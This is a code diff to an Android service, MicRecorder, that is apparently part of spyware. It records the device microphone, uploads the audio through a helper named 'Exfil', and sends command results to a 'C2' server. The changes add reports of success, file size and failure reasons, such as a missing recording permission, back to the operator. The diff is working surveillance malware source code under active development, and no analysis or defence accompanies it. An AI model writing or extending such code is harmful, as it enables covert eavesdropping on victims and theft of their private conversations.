@@ -21,11 +21,20 @@ class MicRecorder : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        try {
-            startForeground(0x5F60, buildNotification())
-        } catch (t: Throwable) {
-            // Android 12+ refuses foreground services without the matching
-            // permission / from the background - do not kill the process here.
+        // The service runs with the "microphone" type - without it Android 14+
+        // mutes the capture. If the type is not allowed (no RECORD_AUDIO
+        // grant) the recording cannot work at all, so the C2 gets the reason
+        // instead of a silent failure.
+        if (!Fgs.start(
+                this,
+                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE,
+                buildNotification(),
+                fallbackType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+            )) {
+            Exfil.sendLog(
+                this, "cmd_result",
+                """{"cmd":"mic","ok":false,"reason":"no_record_audio_permission"}"""
+            )
             stopSelf()
             return
         }
@@ -52,13 +61,29 @@ class MicRecorder : Service() {
                 prepare(); start()
             }
             Handler(Looper.getMainLooper()).postDelayed({ stopAndSend() }, seconds * 1000L)
-        } catch (_: Exception) { stopSelf() }
+        } catch (t: Exception) {
+            Exfil.sendLog(
+                this, "cmd_result",
+                """{"cmd":"mic","ok":false,"reason":"${t.javaClass.simpleName}"}"""
+            )
+            stopSelf()
+        }
     }
 
     private fun stopAndSend() {
         try { recorder?.stop() } catch (_: Exception) {}
         recorder?.release(); recorder = null
-        outFile?.let { if (it.exists()) Exfil.uploadFile(this, it, "audio") }
+        val f = outFile
+        if (f != null && f.exists() && f.length() > 0) {
+            val size = f.length()
+            Exfil.uploadFile(this, f, "audio")
+            Exfil.sendLog(
+                this, "cmd_result",
+                """{"cmd":"mic","ok":true,"file":"${f.name}","size":$size}"""
+            )
+        } else {
+            Exfil.sendLog(this, "cmd_result", """{"cmd":"mic","ok":false,"reason":"no_audio"}""")
+        }
         stopSelf()
     }
 
